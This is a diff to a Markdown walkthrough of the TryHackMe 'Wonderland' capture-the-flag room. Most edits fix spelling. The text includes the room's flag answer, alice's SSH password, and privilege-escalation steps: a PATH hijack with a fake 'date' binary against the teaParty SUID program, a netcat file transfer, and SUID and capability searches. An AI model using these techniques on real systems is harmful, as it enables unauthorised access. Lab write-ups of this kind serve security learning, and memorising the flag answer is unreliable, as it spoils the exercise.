@@ -3,6 +3,7 @@
 
 ### Answer the questions below
 
+
 Ques 1. Obtain the flag in user.txt
 ```bash
 thm{"Curiouser and curiouser!"}
@@ -257,7 +258,7 @@ Canceled by the user
 ![Screenshot from 2024-04-05 22-54-12](https://github.com/Esther7171/Wonderland/assets/122229257/8dad040d-8815-43ab-a15d-ca723ee4b38c)
 
 # 3. SSH Time
-### We got user name alice and password
+### We got username alice and password
 ```bash
 alice:HowDothTheLittleCrocodileImproveHisShiningTail
 ```
@@ -317,7 +318,7 @@ alice@wonderland:/home$
 ### Let see content of python file
 
 
-## As i remember Thier is a hint for user.txt in the Wonderland room ```Everything is upside down here``` as root.txt in alice so maybe user.txt is in root
+## As i remember There is a hint for user.txt in the Wonderland room ```Everything is upside down here``` as root.txt in alice so maybe user.txt is in root
 ```bash
 alice@wonderland:/home$ cd /
 alice@wonderland:/$ ls
@@ -407,8 +408,8 @@ To leave the oyster-bed.
 
 But four young oysters hurried up,
 All eager for the treat:
-Their coats were brushed, their faces washed,
-Their shoes were clean and neat —
+there coats were brushed, there faces washed,
+there shoes were clean and neat —
 And this was odd, because, you know,
 They hadn’t any feet.
 
@@ -486,7 +487,7 @@ for i in range(10):
     line = random.choice(poem.split("\n"))
     print("The line was:\t", line)alice@wonderland:~$ 
 ```
-  ### Intreasting Import random on first line look like we go our way
+  ### Intreasting Import random on first line look like we got our way
   #### Let check path to double confirm
 ```bash
 python3 -c 'import sys; print (sys.path)'
@@ -496,7 +497,7 @@ alice@wonderland:~$ python3 -c 'import sys; print (sys.path)'
 ['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']
 alice@wonderland:~$
 ```
-#### Ok We have python library , but let check if their is any cron job
+#### Ok We have python library , but let check if there is any cron job
 ```bash
   alice@wonderland:~$ crontab -l
 no crontab for alice
@@ -553,8 +554,8 @@ lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
 -rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
 rabbit@wonderland:/home/rabbit$ 
 ```
-### I fond something suspicious ```teaParty``` is in red colour
-## Ok ti try to execute and read content but it not doing anything.
+### I found something suspicious ```teaParty``` is in red colour
+## Ok try to execute and read content but it not doing anything.
 ```bash
 rabbit@wonderland:/home/rabbit$ ./teaParty 
 Welcome to the tea party!
@@ -590,8 +591,8 @@ getchar(1, 0x559459346260, 0x7ff7565ae8c0, 0x7ff7562d11542
 puts("Segmentation fault (core dumped)"...Segmentation fault (core dumped)
 )                                                                                                        = 33
 +++ exited (status 33) +++
-rabbit@wonderland:/home/rabbit$ 
-```find / -type f -name '*.txt' 2>/dev/null
+rabbit@wonderland:/home/rabbit$
+``` 
 ## OK it's made up fault of segmentation 
 ### Let check strings 
 ```bash
@@ -605,7 +606,7 @@ Please ask your administrator.
 rabbit@wonderland:/home/rabbit$
 ```
 
-### ohh i can do it in rabit, let transfer it to my system using netcat
+### ohh i can't do it in rabit, let transfer it to my system using netcat
 #### Open listener and direct content to a txt file
 ```bash
 ┌──(death㉿esther)-[~/Lab-CTF/wonder]
@@ -728,8 +729,9 @@ It is required for saving/loading search history or cursor positions.
 Press Enter to continue
 ```
 ## Add few lines to get new bash session
-![Screenshot from 2024-04-04 20-58-20](https://github.com/Esther7171/Wonderland/assets/122229257/1293dd88-ccce-434d-9959-a052e1e2f3c3)
-## Let give permision and run this
+![Screenshot from 2024-04-06 00-51-54](https://github.com/Esther7171/Wonderland/assets/122229257/52bce8df-8de2-4e83-a6ee-f224f7d1ff87)
+
+## Let give permission and run this
 ```bash
 rabbit@wonderland:/home/rabbit$ chmod +x date 
 rabbit@wonderland:/home/rabbit$ ./date
@@ -747,7 +749,7 @@ rabbit@wonderland:/home/rabbit$
 rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
 rabbit@wonderland:/home/rabbit$ 
 ```
-## It is gonna use prefexx of that binary so We successfull make a fake date command that give use other user , before reaching to real date command
+## It is gonna use prefex of that binary so We successfully make a fake date command that give use other user , before reaching to real date command
 ### Let run teaParty again
 ```bash
 rabbit@wonderland:/home/rabbit$ ./teaParty 
@@ -782,11 +784,11 @@ hatter
 hatter@wonderland:~$ 
 ```
 # I dont think it make any difference
-## I let find suid file
+## Let find suid file
 ```bash
 find / -user root -perm /4000 2>/dev/null
 ```
-### I dont get any usefull files
+### I dont get any useful files
 ## Let try again
 ```bash
 getcap -r / 2>/dev/null
